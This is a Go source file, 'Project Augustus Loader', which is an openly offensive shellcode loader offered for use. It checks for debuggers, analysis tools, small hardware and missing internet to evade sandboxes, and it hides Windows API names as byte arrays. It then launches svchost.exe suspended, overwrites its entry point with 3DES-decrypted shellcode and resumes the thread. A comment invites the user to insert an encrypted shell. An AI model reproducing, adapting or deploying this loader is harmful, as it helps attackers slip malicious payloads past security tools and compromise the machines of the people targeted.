/*
            Project Augustus Loader
                VERSION: 1.2
 AUTHOR: @tunnelgre - https://twitter.com/tunnelgre
	              

*/

package main

import (
	"net/http"
	"crypto/cipher"
	"crypto/des"
	"strings"
	"syscall"
	"unsafe"
	"encoding/binary"
	"runtime"
  	"time"
)

type PROCESS_BASIC_INFORMATION struct {
	Reserved1    uintptr
	PebAddress   uintptr
	Reserved2    uintptr
	Reserved3    uintptr
	UniquePid    uintptr
	MoreReserved uintptr
}

type memStatusEx struct {
    dwLength        uint32
    dwMemoryLoad    uint32
    ullTotalPhys    uint64
    ullAvailPhys    uint64
    ullTotalPageFile uint64
    ullAvailPageFile uint64
    ullTotalVirtual uint64
    ullAvailVirtual uint64
    ullAvailExtendedVirtual uint64
}


const (
	TH32CS_SNAPPROCESS = 0x00000002
	INVALID_HANDLE_VALUE = ^uintptr(0)
)

type PROCESSENTRY32 struct {
	dwSize              uint32
	cntUsage            uint32
	th32ProcessID       uint32
	th32DefaultHeapID   uintptr
	th32ModuleID        uint32
	cntThreads          uint32
	th32ParentProcessID uint32
	pcPriClassBase      int32
	dwFlags             uint32
	szExeFile           [260]uint16
}

func IsProcessRunning(processName string) bool {
	hSnap, _, _ := 	syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'C', 'r', 'e', 'a', 't', 'e', 'T', 'o', 'o', 'l', 'h', 'e', 'l', 'p', '3', '2', 'S', 'n', 'a', 'p', 's', 'h',  'o', 't',
	})).Call(uintptr(TH32CS_SNAPPROCESS), 0)
	if hSnap == uintptr(INVALID_HANDLE_VALUE) {
		return false
	}
	defer syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 
	})).Call(hSnap)

	var pe32 PROCESSENTRY32
	pe32.dwSize = uint32(unsafe.Sizeof(pe32))
	ret, _, _ := syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'P', 'r', 'o', 'c', 'e', 's', 's', '3', '2', 'F', 'i', 'r', 's', 't', 'W', 
	})).Call(hSnap, uintptr(unsafe.Pointer(&pe32)))

	for ret != 0 {
		if strings.EqualFold(processName, syscall.UTF16ToString(pe32.szExeFile[:])) {
			return true
		}
		ret, _, _ = syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'P', 'r', 'o', 'c', 'e', 's', 's', '3', '2', 'N', 'e', 'x', 't', 'W', 
	})).Call(hSnap, uintptr(unsafe.Pointer(&pe32)))
	}

	return false
}



func CheckSandbox() bool {
	processes := []string{
		"ollydbg.exe",
		"ProcessHacker.exe",
		"tcpview.exe",
		"autoruns.exe",
		"autorunsc.exe",
		"filemon.exe",
		"procmon.exe",
		"regmon.exe",
		"procexp.exe",
		"idaq.exe",
		"idaq64.exe",
		"ImmunityDebugger.exe",
		"Wireshark.exe",
		"dumpcap.exe",
		"HookExplorer.exe",
		"ImportREC.exe",
		"PETools.exe",
		"LordPE.exe",
		"SysInspector.exe",
		"proc_analyzer.exe",
		"sysAnalyzer.exe",
		"sniff_hit.exe",
		"windbg.exe",
		"joeboxcontrol.exe",
		"joeboxserver.exe",
		"ResourceHacker.exe",
		"x32dbg.exe",
		"x64dbg.exe",
		"Fiddler.exe",
		"httpdebugger.exe",
		"srvpost.exe",	
	}

	processSandbox := false
	for _, process := range processes {
		if IsProcessRunning(process) {
			processSandbox = true
			break
		}
	}


    cpuSandbox := runtime.NumCPU() <= 2
    msx := &memStatusEx{
        dwLength: 64,
    }
    r1, _, _ := syscall.NewLazyDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).NewProc(string([]byte{
		'G', 'l', 'o', 'b', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 'S', 't', 'a', 't', 'u', 's', 'E','x', 
	})).Call(uintptr(unsafe.Pointer(msx)))
    memorySandbox := r1 == 0 || msx.ullTotalPhys < 4174967296
    lpTotalNumberOfBytes := int64(0)
    diskret, _, _ := syscall.NewLazyDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).NewProc(string([]byte{
		'G', 'e', 't', 'D', 'i', 's', 'k', 'F', 'r', 'e', 'e', 'S', 'p', 'a', 'c', 'e', 'E', 'x', 'W',
	})).Call(
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("C:\\"))),
        uintptr(0),
        uintptr(unsafe.Pointer(&lpTotalNumberOfBytes)),
        uintptr(0),
    )
    diskSandbox := diskret == 0 || lpTotalNumberOfBytes < 60719476736

    client := http.Client{
        Timeout: 3 * time.Second,
    }
    _, err := client.Get("https://google.com")
    internetSandbox := err != nil


    return cpuSandbox || memorySandbox || diskSandbox || internetSandbox || processSandbox
}


func zzzh() {
	const S = 500000

	for i := 0; i <= S; i++ {
		for j := 2; j <= i/2; j++ {
			if i%j == 0 {
				break
			}
		}
	}
}


func main() {

    if CheckSandbox() {
        return 
    }
	zzzh()		
	epath := []byte{
		'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 's', 'v', 'c', 'h', 'o', 's', 't', '.', 'e', 'x', 'e',
	}
	path := string(epath) 
	
	//insert here your encrypted shell
	sch := []byte("")
	key := []byte("")
	iv := []byte("")

	startupInfo := &syscall.StartupInfo{}
	processInfo := &syscall.ProcessInformation{}
	pathArray := append([]byte(path), byte(0))
	syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 
	})).Call(0, uintptr(unsafe.Pointer(&pathArray[0])), 0, 0, 0, 0x4, 0, 0, uintptr(unsafe.Pointer(startupInfo)), uintptr(unsafe.Pointer(processInfo)))

	pointerSize := unsafe.Sizeof(uintptr(0))
	basicInfo := &PROCESS_BASIC_INFORMATION{}
	tmp := 0
	syscall.MustLoadDLL(string([]byte{
		'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'Z', 'w', 'Q', 'u', 'e', 'r', 'y', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 
	})).Call(uintptr(processInfo.Process), 0, uintptr(unsafe.Pointer(basicInfo)), pointerSize*6, uintptr(unsafe.Pointer(&tmp)))

	imageBaseAddress := basicInfo.PebAddress + 0x10
	addressBuffer := make([]byte, pointerSize)
	read := 0
	syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'R', 'e', 'a', 'd', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', 
	})).Call(uintptr(processInfo.Process), imageBaseAddress, uintptr(unsafe.Pointer(&addressBuffer[0])), uintptr(len(addressBuffer)), uintptr(unsafe.Pointer(&read)))

	imageBaseValue := binary.LittleEndian.Uint64(addressBuffer)
	addressBuffer = make([]byte, 0x200)
	syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'R', 'e', 'a', 'd', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', 
	})).Call(uintptr(processInfo.Process), uintptr(imageBaseValue), uintptr(unsafe.Pointer(&addressBuffer[0])), uintptr(len(addressBuffer)), uintptr(unsafe.Pointer(&read)))

	lfaNewPos := addressBuffer[0x3c : 0x3c+0x4]
	lfanew := binary.LittleEndian.Uint32(lfaNewPos)
	entrypointOffset := lfanew + 0x28
	entrypointOffsetPos := addressBuffer[entrypointOffset : entrypointOffset+0x4]
	entrypointRVA := binary.LittleEndian.Uint32(entrypointOffsetPos)
	entrypointAddress := imageBaseValue + uint64(entrypointRVA)
	zzzh()
	decryptedsch := decryptDES3(sch, key, iv)
		syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', 
	})).Call(uintptr(processInfo.Process), uintptr(entrypointAddress), uintptr(unsafe.Pointer(&decryptedsch[0])), uintptr(len(decryptedsch)), 0)

	syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 
	})).Call(uintptr(processInfo.Thread))
}


func decryptDES3(ciphertext, key, iv []byte) []byte {
    block, _ := des.NewTripleDESCipher(key)
    mode := cipher.NewCBCDecrypter(block, iv)

    decrypted := make([]byte, len(ciphertext))
    mode.CryptBlocks(decrypted, ciphertext)

    decrypted = unpad(decrypted)

    return decrypted
}
func unpad(data []byte) []byte {
	padding := int(data[len(data)-1])
	return data[:len(data)-padding]
}
